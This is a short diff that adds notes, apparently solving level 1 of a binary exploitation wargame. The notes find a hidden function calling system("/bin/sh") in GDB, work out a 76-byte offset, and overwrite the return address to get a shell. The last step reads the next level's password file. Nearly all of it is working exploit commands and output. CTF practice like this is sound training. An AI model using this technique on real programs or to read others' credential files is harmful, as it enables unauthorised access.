@@ -1,0 +1,30 @@
+disas main
+
+info function
+	0x08048444  run
+
+disas run 
+	0x08048472 <+46>:    movl   $0x8048584,(%esp)
+	0x08048479 <+53>:    call   0x8048360 <system@plt>
+
+x/s 0x8048584
+	0x8048584:       "/bin/sh"
+
+python -c 'print "B"*80' > /tmp/payload
+
+Dans GDB : r < /tmp/payload
+	Program received signal SIGSEGV, Segmentation fault.
+	0x42424242 in ?? ()
+
+python -c 'print "B"*76' > /tmp/payload
+
+(gdb) r < /tmp/payload 
+	Program received signal SIGILL, Illegal instruction.
+	0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+
+python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
+
+cat /tmp/payload - | ./level1
+	Good... Wait what?
+
+cat /home/user/level2/.pass
